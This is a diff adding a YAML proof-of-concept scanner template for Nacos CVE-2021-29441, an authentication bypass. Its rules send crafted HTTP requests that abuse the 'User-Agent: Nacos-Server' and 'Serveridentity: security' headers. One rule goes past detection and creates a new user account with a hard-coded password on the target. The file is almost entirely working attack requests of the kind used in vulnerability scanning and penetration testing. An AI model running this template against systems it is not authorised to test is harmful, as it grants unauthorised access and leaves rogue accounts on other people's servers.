@@ -1,0 +1,49 @@
+name: poc-yaml-nacos-ua-authorized-bypass
+transport: http
+rules:
+  r1:
+    request:
+      method: GET
+      path: /nacos/v1/auth/users?pageNo=1&pageSize=1
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+    expression: |
+      response.status_code==200 && operator.contains(response.text,'"totalCount":')
+    output: 
+      nacos_v1: ""
+  r2:
+    request:
+      method: POST
+      path: /nacos/v1/auth/users
+      body: username=nacps-test&password=3FESFkdhsajADWwaasddd111
+      headers:
+        Accept: application/json, text/plain, */*
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Nacos-Server
+    expression: |
+      response.status_code==200 && operator.contains(response.text,'message":"create user ok!",')
+    output: 
+      nacos_v1: "已创建用户nacps-test/3FESFkdhsajADWwaasddd111"
+  r3:
+    request:
+      method: GET
+      path: /nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken=
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Serveridentity: security
+    expression: |
+      response.status_code==200 && operator.contains(response.text,'"totalCount":')
+    output: 
+      nacos_v2: "存在请求头Serveridentity: security绕过"
+output: "$nacos_v1 {{'$nacos_v2'  if len('$nacos_v2')>0 else ''}}"
+
+expression: (r1() && r2()) || r3()
+detail:
+  name: 'Nacos未授权访问CVE-2021-29441'
+  author: qianxiao996
+  group: 未授权访问
+  category: Nacos
+  vuln_id: CVE-2021-29441
+  description: 'Nacos未授权访问CVE-2021-29441'
+  links: []
